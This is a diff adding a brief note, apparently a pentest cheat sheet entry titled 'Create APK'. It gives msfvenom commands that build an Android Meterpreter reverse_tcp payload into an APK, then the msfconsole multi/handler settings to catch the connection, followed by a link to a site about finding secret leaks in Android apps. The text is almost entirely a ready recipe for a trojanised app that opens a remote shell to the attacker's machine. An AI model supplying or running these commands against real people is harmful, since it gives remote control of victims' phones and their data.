@@ -1,0 +1,12 @@
+Create APK
+---
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > FILENAME.apk
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST <ip> *
+set LPORT <port>
+exploit -j
+
+[Find Secrets leak in Android apps](https://android.fallible.co/)
